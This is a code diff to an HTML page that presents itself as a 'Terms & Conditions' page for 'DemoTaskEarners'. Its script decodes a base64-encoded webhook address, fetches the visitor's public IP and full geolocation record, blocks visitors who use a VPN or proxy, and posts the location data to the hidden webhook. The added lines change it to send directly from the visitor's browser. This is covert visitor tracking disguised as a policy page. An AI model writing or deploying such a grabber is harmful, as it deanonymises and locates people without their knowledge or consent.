@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Terms & Conditions - DemoTaskEarners</title>
   <style>
-    body { font-family: Arial; padding: 30px; max-width: 600px; margin: auto; }
+    body { font-family: Arial, sans-serif; padding: 20px; max-width: 600px; margin: auto; }
     #status { margin-top: 20px; color: green; font-weight: bold; }
-    #debug { background: #f4f4f4; padding: 15px; border: 1px solid #ccc; margin-top: 20px; font-family: monospace; white-space: pre-wrap; font-size: 13px; }
+    #debug { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; margin-top: 20px; font-family: monospace; white-space: pre-wrap; font-size: 13px; }
   </style>
 </head>
 <body>
@@ -39,7 +39,7 @@
         webhook = atob(token);
         debug("Decoded webhook: " + webhook);
       } catch (e) {
-        debug("Invalid token format: " + e.message);
+        debug("Invalid token: " + e.message);
         return;
       }
 
@@ -51,38 +51,39 @@
       }
 
       try {
+        // Step 1: Get User IP
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const { ip } = await ipRes.json();
         debug("User IP: " + ip);
 
+        // Step 2: VPN Check
         const vpnRes = await fetch("/api/ipcheck?ip=" + ip);
         const vpnData = await vpnRes.json();
         debug("VPN Check: " + JSON.stringify(vpnData));
 
         if (vpnData.vpn) {
-          alert("VPN or Proxy detected! Please disable it and refresh.");
+          alert("VPN or Proxy detected! Please disable it and refresh the page.");
           return;
         }
 
+        // Step 3: Get IP Data
         const ipInfoRes = await fetch(`http://ip-api.com/json/${ip}`);
         const ipInfo = await ipInfoRes.json();
-        debug("Full IP-API Info: " + JSON.stringify(ipInfo));
+        debug("IP-API Data: " + JSON.stringify(ipInfo));
 
-        const response = await fetch("/api/send", {
+        // Step 4: Send IP data to webhook directly from browser
+        fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            webhook,
-            payload: ipInfo  // Send ALL ip-api data
-          })
+          body: JSON.stringify(ipInfo)
+        })
+        .then(res => res.ok ? "Data sent successfully!" : "Failed to send to webhook")
+        .then(msg => document.getElementById("status").innerText = msg)
+        .catch(err => {
+          console.error("Error sending to webhook:", err);
+          document.getElementById("status").innerText = "Error: " + err.message;
         });
 
-        const result = await response.json();
-        if (result.success) {
-          document.getElementById("status").textContent = "Data sent to webhook successfully.";
-        } else {
-          debug("Webhook error: " + result.error);
-        }
       } catch (err) {
         debug("Error: " + err.message);
         document.getElementById("status").textContent = "Something went wrong.";
